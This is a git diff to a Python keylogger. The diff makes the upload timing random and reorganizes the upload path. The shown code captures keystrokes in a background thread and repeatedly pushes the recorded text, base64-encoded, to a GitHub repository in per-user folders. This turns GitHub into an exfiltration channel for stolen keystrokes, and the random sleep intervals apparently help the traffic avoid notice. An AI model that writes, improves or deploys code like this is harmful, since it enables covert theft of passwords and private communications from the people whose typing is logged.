@@ -6,6 +6,7 @@ from datetime import datetime
 import os
 import base64
 import sys
+import random
 
 PATH_ON_GITHUB = f"data/"
 USER = os.getlogin()
@@ -58,28 +59,26 @@ class KeyLogger:
     def run(self):
         t = threading.Thread(target=self.start_logger)
         t.start()
-        return t
 
 def run():
     kl = KeyLogger()
-    """
-    TODO: ADD A WAY TO PRINT THE OPENED SOFTWARE NAME
-    """
-    t = kl.run()
+    kl.run()
 
     print('[+] Sucessfully started listening on key strokes')
     while True:
-        time.sleep(1 * 10)
+        time.sleep(random.randint(3, 10))
         commit_message = datetime.now().isoformat()
-        file = f'{PATH_ON_GITHUB}{USER}-{commit_message}.data'
+
+        # FOR KEYLOGGER
+        remote_keystroke_path = f'{PATH_ON_GITHUB}{USER}/keystrokes/{commit_message}.data'
         bindata = bytes(kl.text_content, "utf-8")
 
         try:
-            kl.repo.create_file(file, commit_message, base64.b64encode(bindata))
+            kl.repo.create_file(remote_keystroke_path, commit_message, base64.b64encode(bindata))
             print("[+] Keystroke record pushed to github")
             kl.reset()
         except Exception as e:
-            print(f'[-] Failed to load data {e}')
+            print(f'[-] Failed to load data to github: {e}')
         
         print('[*] Recording started again.')
     
